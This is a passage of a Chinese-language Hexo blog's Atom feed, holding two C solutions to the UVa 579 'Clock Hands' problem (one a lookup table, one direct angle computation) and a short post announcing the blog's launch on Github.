class="string">"131.500"</span>, <span class="string">"137.000"</span>, <span class="string">"142.500"</span>, <span class="string">"148.000"</span>, <span class="string">"153.500"</span>, <span class="string">"159.000"</span>, <span class="string">"164.500"</span>, <span class="string">"170.000"</span>, <span class="string">"175.500"</span>, <span class="string">"179.000"</span>, <span class="string">"173.500"</span>, <span class="string">"168.000"</span>, <span class="string">"162.500"</span>, <span class="string">"157.000"</span>, <span class="string">"151.500"</span>, <span class="string">"146.000"</span>, <span class="string">"140.500"</span>, <span class="string">"135.000"</span>, <span class="string">"129.500"</span>, <span class="string">"124.000"</span>, <span class="string">"118.500"</span>, <span class="string">"113.000"</span>, <span class="string">"107.500"</span>, <span class="string">"102.000"</span>, <span class="string">"96.500"</span>, <span class="string">"91.000"</span>, <span class="string">"85.500"</span>, <span class="string">"80.000"</span>, <span class="string">"74.500"</span>, <span class="string">"69.000"</span>, <span class="string">"63.500"</span>, <span class="string">"58.000"</span>, <span class="string">"52.500"</span>, <span class="string">"47.000"</span>, <span class="string">"41.500"</span>, <span class="string">"36.000"</span>, <span class="string">"30.500"</span>, <span class="string">"25.000"</span>, <span class="string">"19.500"</span>, <span class="string">"14.000"</span>, <span class="string">"8.500"</span>, <span class="string">"3.000"</span>, <span class="string">"2.500"</span>, <span class="string">"8.000"</span>, <span class="string">"13.500"</span>, <span class="string">"19.000"</span>, <span class="string">"24.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"30.000"</span>, <span class="string">"35.500"</span>, <span class="string">"41.000"</span>, <span class="string">"46.500"</span>, <span class="string">"52.000"</span>, <span class="string">"57.500"</span>, <span class="string">"63.000"</span>, <span class="string">"68.500"</span>, <span class="string">"74.000"</span>, <span class="string">"79.500"</span>, <span class="string">"85.000"</span>, <span class="string">"90.500"</span>, <span class="string">"96.000"</span>, <span class="string">"101.500"</span>, <span class="string">"107.000"</span>, <span class="string">"112.500"</span>, <span class="string">"118.000"</span>, <span class="string">"123.500"</span>, <span class="string">"129.000"</span>, <span class="string">"134.500"</span>, <span class="string">"140.000"</span>, <span class="string">"145.500"</span>, <span class="string">"151.000"</span>, <span class="string">"156.500"</span>, <span class="string">"162.000"</span>, <span class="string">"167.500"</span>, <span class="string">"173.000"</span>, <span class="string">"178.500"</span>, <span class="string">"176.000"</span>, <span class="string">"170.500"</span>, <span class="string">"165.000"</span>, <span class="string">"159.500"</span>, <span class="string">"154.000"</span>, <span class="string">"148.500"</span>, <span class="string">"143.000"</span>, <span class="string">"137.500"</span>, <span class="string">"132.000"</span>, <span class="string">"126.500"</span>, <span class="string">"121.000"</span>, <span class="string">"115.500"</span>, <span class="string">"110.000"</span>, <span class="string">"104.500"</span>, <span class="string">"99.000"</span>, <span class="string">"93.500"</span>, <span class="string">"88.000"</span>, <span class="string">"82.500"</span>, <span class="string">"77.000"</span>, <span class="string">"71.500"</span>, <span class="string">"66.000"</span>, <span class="string">"60.500"</span>, <span class="string">"55.000"</span>, <span class="string">"49.500"</span>, <span class="string">"44.000"</span>, <span class="string">"38.500"</span>, <span class="string">"33.000"</span>, <span class="string">"27.500"</span>, <span class="string">"22.000"</span>, <span class="string">"16.500"</span>, <span class="string">"11.000"</span>, <span class="string">"5.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"0.000"</span>, <span class="string">"5.500"</span>, <span class="string">"11.000"</span>, <span class="string">"16.500"</span>, <span class="string">"22.000"</span>, <span class="string">"27.500"</span>, <span class="string">"33.000"</span>, <span class="string">"38.500"</span>, <span class="string">"44.000"</span>, <span class="string">"49.500"</span>, <span class="string">"55.000"</span>, <span class="string">"60.500"</span>, <span class="string">"66.000"</span>, <span class="string">"71.500"</span>, <span class="string">"77.000"</span>, <span class="string">"82.500"</span>, <span class="string">"88.000"</span>, <span class="string">"93.500"</span>, <span class="string">"99.000"</span>, <span class="string">"104.500"</span>, <span class="string">"110.000"</span>, <span class="string">"115.500"</span>, <span class="string">"121.000"</span>, <span class="string">"126.500"</span>, <span class="string">"132.000"</span>, <span class="string">"137.500"</span>, <span class="string">"143.000"</span>, <span class="string">"148.500"</span>, <span class="string">"154.000"</span>, <span class="string">"159.500"</span>, <span class="string">"165.000"</span>, <span class="string">"170.500"</span>, <span class="string">"176.000"</span>, <span class="string">"178.500"</span>, <span class="string">"173.000"</span>, <span class="string">"167.500"</span>, <span class="string">"162.000"</span>, <span class="string">"156.500"</span>, <span class="string">"151.000"</span>, <span class="string">"145.500"</span>, <span class="string">"140.000"</span>, <span class="string">"134.500"</span>, <span class="string">"129.000"</span>, <span class="string">"123.500"</span>, <span class="string">"118.000"</span>, <span class="string">"112.500"</span>, <span class="string">"107.000"</span>, <span class="string">"101.500"</span>, <span class="string">"96.000"</span>, <span class="string">"90.500"</span>, <span class="string">"85.000"</span>, <span class="string">"79.500"</span>, <span class="string">"74.000"</span>, <span class="string">"68.500"</span>, <span class="string">"63.000"</span>, <span class="string">"57.500"</span>, <span class="string">"52.000"</span>, <span class="string">"46.500"</span>, <span class="string">"41.000"</span>, <span class="string">"35.500"</span>&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> h, m;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d:%d"</span>, &amp;h, &amp;m), h || m)</div><div class="line">        <span class="built_in">puts</span>(table[h][m]);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;題目連結：&lt;a href=&quot;https://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;amp;Itemid=8&amp;amp;category=24&amp;amp;page=show_problem&amp;amp;problem=520&quot;&gt;UVa 579 - Clock Hands&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;解法1&quot;&gt;&lt;a href=&quot;#解法1&quot; class=&quot;headerlink&quot; title=&quot;解法1&quot;&gt;&lt;/a&gt;解法1&lt;/h1&gt;&lt;p&gt;直接算角度相減，輸出小於等於180度角的部分 (0.030s)&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;math.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; h, m;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;float&lt;/span&gt; ang1, ang2, ans;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;built_in&quot;&gt;scanf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%d:%d&quot;&lt;/span&gt;, &amp;amp;h, &amp;amp;m), h || m) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ang1 = h * &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt; + m * &lt;span class=&quot;number&quot;&gt;0.5&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ang2 = m * &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ans = &lt;span class=&quot;built_in&quot;&gt;fabs&lt;/span&gt;(ang1 - ang2);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ans &amp;gt; &lt;span class=&quot;number&quot;&gt;180&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            ans = &lt;span class=&quot;number&quot;&gt;360&lt;/span&gt; - ans;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%.3f\n&quot;&lt;/span&gt;, ans);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Online Judge" scheme="https://andyw330.github.io/categories/Online-Judge/"/>
    
    
      <category term="UVa" scheme="https://andyw330.github.io/tags/UVa/"/>
    
  </entry>
  
  <entry>
    <title>Blog開張</title>
    <link href="https://andyw330.github.io/2017/03/12/hello-world/"/>
    <id>https://andyw330.github.io/2017/03/12/hello-world/</id>
    <published>2017-03-11T16:00:00.000Z</published>
    <updated>2017-03-12T14:57:28.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用-Hexo-Github-建-Blog"><a href="#使用-Hexo-Github-建-Blog" class="headerlink" title="使用 Hexo + Github 建 Blog"></a>使用 Hexo + Github 建 Blog</h1><p>先前用過 logdown 來寫文章，但覺得它的 editor 不是很好用，而且還有很多問題（escape問題、光標跑掉等等QQ），所以就放棄了。比對過各種架站方法跟套件，最後選擇用 Hexo + Github 來做，看起來非常自由，架起來也非常快速，而且用 Github hosting 沒煩惱！</p>
<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>一直說要另外架blog寫文章，說了好久都沒有行動，直到現在終於架起來啦！⎝(　ﾟ∀ﾟ)⎠<br>至於文章走向大概會是放些CTF跟Online Judge題目的解法、技術相關文章，還有一些記事吧。<br>只不過有沒有那個毅力跟時間去寫就不知道了QQ<br>請大家多多指教~ ˊˇˋ</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;使用-Hexo-Github-建-Blog&quot;&gt;&lt;a href=&quot;#使用-Hexo-Github-建-Blog&quot; class=&quot;headerlink&quot; title=&quot;使用 Hexo + Github 建 Blog&quot;&gt;&lt;/a&gt;使用 Hexo + Github 建 Bl
    
    </summary>
    
      <category term="Blog" scheme="https://andyw330.github.io/categories/Blog/"/>
    
    
      <category term="Blog" scheme="https://andyw330.github.io/tags/Blog/"/>
    
      <category term="Hexo" scheme="https://andyw330.github.io/tags/Hexo/"/>
    
      <category term="Github" scheme="https://andyw330.github.io/tags/Github/"/>
    
  </entry>
  
</feed>
